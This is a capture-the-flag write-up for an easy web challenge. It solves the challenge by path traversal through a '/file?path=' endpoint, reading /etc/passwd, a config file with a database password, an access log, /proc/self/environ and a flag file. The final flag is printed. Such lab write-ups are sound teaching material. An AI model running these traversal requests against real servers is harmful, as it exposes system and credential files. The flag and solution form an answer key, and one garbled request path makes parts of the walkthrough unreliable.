## The Robot's Trail

**Author**: Expli0it3r

**Category**: Web

**Difficulty**: Easy

## Description
You enter a virtual maze, a labyrinth of shifting corridors and endless paths. A guardian robot patrols the floor, leaving a trail behind as it moves. Follow the path it carves, trace its movements carefully, and uncover the key it leads you to. Only by following the robot’s trail can you reach the door to the next floor.

## Writeup

First inspect or look at the source code 

```
<div class="hidden">
        <p>Start by checking what this site tells search engine bots in <a href="/robots.txt" style="color: #00bcd4;">robots.txt</a></p>
</div>
```

so we get a hint to go to the robots.txt endpoint on  going there u get

```
User-agent: *

# We value our digital privacy and have restricted access to certain system-level configurations.
Disallow: /file?path=../../etc/passwd
Disallow: /file?path=../../../etc/passwd

# Hint for curious explorers: 
# Sometimes system files like /etc/passwd can reveal interesting information...
# But remember to respect privacy boundaries!
```

so u go to the /file?path=../../etc/passwd endpoint and it says 

```
"root:x:0:0:root:/root:/bin/bash\n"
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
            "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
            "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
            "webadmin:x:1000:1000:Check the web server config at /var/www/html/config.php:/home/webadmin:/bin/bash\n"
```

so u try the /file?path=/var/www/html/config.php:/home/webadmin:/bin/bash and u get

```
"<?php\n"
            "// Database configuration\n"
            "$db_host = 'localhost';\n"
            "$db_user = 'admin';\n"
            "$db_pass = 's3cr3t_p@ssw0rd';\n"
            "// Debug info: Check the access logs for unusual activity\n"
            "// Log location: /var/log/apache2/access.log\n"
            "?>"
```

so u try the /file?path=/var/log/apache2/access.log and u get

```
"127.0.0.1 - - [01/Jan/2023:10:30:45 +0000] \"GET / HTTP/1.1\" 200 1234 \"-\" \"Mozilla/5.0\"\n"
            "192.168.1.100 - - [01/Jan/2023:10:31:22 +0000] \"GET /file?path=../../etc/passwd HTTP/1.1\" 200 567 \"-\" \"Python-urllib\"\n"
            "10.0.0.50 - - [01/Jan/2023:10:32:15 +0000] \"GET /admin HTTP/1.1\" 404 289 \"-\" \"curl\"\n"
            "# Interesting environment variables might be found at /proc/self/environ\n"
            "203.0.113.5 - - [01/Jan/2023:10:33:01 +0000] \"POST /login HTTP/1.1\" 302 - \"-\" \"Mozilla/5.0\"\n"
```

and then u go to /file?path=/proc/self/environ and u get 

```
"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
            "HOSTNAME=web-server-01\n"
            "USER=www-data\n"
            "HOME=/var/www\n"
            "SECRET_LOCATION=/home/ctf/.secret\n"
            "PWD=/var/www/html\n"
            "LANG=C.UTF-8\n"
            "SHLVL=1\n"
```

and then u go to /file?path=/home/ctf/.secret and u get 

```
"Directory listing for /home/ctf/.secret:\n"
            "total 12\n"
            "drwx------ 2 ctf ctf 4096 Jan  1 10:00 .\n"
            "drwxr-xr-x 5 ctf ctf 4096 Jan  1 09:55 ..\n"
            "-r-------- 1 ctf ctf   48 Jan  1 10:00 flag.txt\n"
            "\n"
```

and then u go to /home/ctf/.secret/flag.txt and u get the flag!

**Flag:** `citadel{p4th_tr4v3rs4l_m4st3ry_4ch13v3d}`
